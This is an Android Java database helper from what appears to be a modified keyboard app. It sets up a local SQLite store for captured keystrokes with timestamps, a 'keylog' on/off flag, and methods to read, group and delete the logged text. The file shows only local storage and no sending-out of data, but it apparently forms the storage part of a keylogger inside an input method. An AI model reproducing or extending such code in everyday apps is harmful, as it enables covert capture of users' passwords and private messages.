package org.pocketworkstation.pckeyboard;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class DBHelper extends SQLiteOpenHelper {
    public static final String DATABASE_NAME = "KEYSDATA.db";
    public static final String TABLE_NAME = "keystrokes";
    public static final String COLUMN_ID = "id";
    public static final String COLUMN_DATA = "data";
    public static final String COLUMN_TIME = "time";


    public DBHelper(Context context) {
        super(context, DATABASE_NAME, null, 1);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL("create table "+TABLE_NAME+" (id integer primary key, data text, time text)");
        db.execSQL("create table keyflag (id integer primary key, flag integer)");
        db.execSQL("insert into keyflag (flag) values(0)");
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS "+TABLE_NAME);
        db.execSQL("DROP TABLE IF EXISTS keyflag");
        onCreate(db);
    }

    public boolean saveKeys(String data, String time){
        SQLiteDatabase db = this.getWritableDatabase();
        ContentValues contentValues = new ContentValues();
        contentValues.put("data", data);
        contentValues.put("time", time);
        db.insert(TABLE_NAME,null,contentValues);
        return true;
    }


    public boolean setKeylogFlag(String id, int flag){
        SQLiteDatabase db = this.getWritableDatabase();
        ContentValues contentValues = new ContentValues();
        contentValues.put("flag",flag);
        db.update("keyflag",contentValues,"id =?",new String[]{id});
        return true;
    }

    public Cursor getKeyFlag(){
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor res = db.rawQuery("select flag from keyflag",null);
        return res;
    }

    public Cursor getAllData(){
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor res = db.rawQuery("select * from "+TABLE_NAME,null);
        return res;
    }

    public Cursor getAllTime(){
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor res = db.rawQuery("select time from "+TABLE_NAME+" group by time order by id desc",null);
        return res;
    }

    public Cursor getAllDataByTime(String time){
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor res = db.query(TABLE_NAME, new String[]{COLUMN_DATA},"time=?", new String[]{time},null,null,null);
        return res;
    }

    public Integer deleteData(String time){
        SQLiteDatabase db = this.getWritableDatabase();
        int i = db.delete(TABLE_NAME,"time=?",new String[]{time});
        return i;
    }

}
